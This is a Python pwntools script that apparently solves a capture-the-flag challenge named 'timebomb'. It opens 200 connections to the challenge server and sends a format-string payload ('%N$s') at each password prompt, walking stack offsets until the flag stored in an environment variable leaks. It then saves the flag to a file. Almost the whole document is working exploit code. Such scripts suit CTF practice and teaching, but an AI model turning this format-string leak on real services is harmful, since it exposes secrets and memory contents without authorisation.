#!/usr/bin/env python3

from pathlib import Path

from pwn import *

ADDR = "timebomb-dc33.hexnova.quest"
BINARY = "./challenge"
LD = "./ld-2.31.so"
LIBC = "./libc.so.6"
PORT = 9999
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(
            [ld.path, elf.path],
            stdin=pty,
            stdout=pty,
            stderr=pty,
            env={"LD_PRELOAD": libc.path, "FLAG": "FLAG-{LocalFlagForTesting}"},
        )
    else:
        return remote(ADDR, PORT)


def main():
    num_conns = 200
    ios = [conn() for _ in range(num_conns)]

    for i in range(num_conns):
        io = ios[i]

        log.info(f"Sending payload #{i}...")
        io.sendlineafter(
            b"Enter your OVERRIDE CODE: ", bytes(f"%{i}$s", encoding="ascii")
        )

        try:
            flag = io.recvuntil(b"\n")[5:-1]

            if b"FLAG" in flag:
                log.success(f"Got the flag!: {flag}")

                flag_filename = "flag.txt"
                with open(flag_filename, "wb") as f:
                    f.write(flag)

                log.info(f"Flag written to: {Path(flag_filename).resolve()}")
                return

        except EOFError:
            pass

        io.close()


if __name__ == "__main__":
    main()
